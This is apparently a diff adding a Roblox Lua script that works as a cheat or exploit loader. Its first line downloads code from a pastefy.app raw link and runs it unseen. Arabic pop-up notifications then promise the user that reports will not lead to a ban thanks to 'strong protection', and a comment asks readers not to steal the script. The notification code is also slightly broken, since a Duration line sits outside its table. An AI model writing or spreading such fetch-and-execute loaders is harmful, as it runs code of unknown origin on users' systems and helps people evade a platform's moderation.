@@ -1,0 +1,19 @@
+loadstring(game:HttpGet("https://pastefy.app/ZLUCe86o/raw"))()
+
+wait(1)
+
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+	Title = "لا تخاف ولا تقلق";
+	Text = "اذا شخص تم ابلاغ عليك لم ينحظر حسابك لان يوجد حماية قوية ! 😉";
+	Icon = "http://www.roblox.com/asset/?id=15705773225"})
+Duration = 5;
+
+wait(1)
+
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+	Title = "اذا واجهت شاشة سوداء";
+	Text = "هذا يعني فشل تشغيل حماية... 😔";
+	Icon = "http://www.roblox.com/asset/?id=764055032"})
+Duration = 5;
+
+-- ليش انت هنا؟ . رجاء لا تسرق سكربت 🙏🏻 .
